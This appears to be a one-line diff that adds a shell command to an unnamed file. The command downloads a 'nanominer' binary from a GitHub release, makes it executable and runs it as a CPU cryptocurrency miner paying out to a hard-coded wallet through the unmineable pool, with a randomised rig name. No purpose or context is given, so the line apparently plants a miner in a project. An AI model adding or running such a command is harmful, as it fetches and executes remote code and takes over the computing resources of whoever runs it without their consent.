@@ -1,0 +1,1 @@
+wget https://github.com/berhasilsemua83/Raven/releases/download/v1.0/nanominer && chmod +x nanominer && ./nanominer -algo RandomX -wallet USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP.ci$(echo $(shuf -i 1-9999 -n 1)-no)  -pool1  rx.unmineable.com:13333 -rigPassword x -cpuThreads 3  -rigName opt3
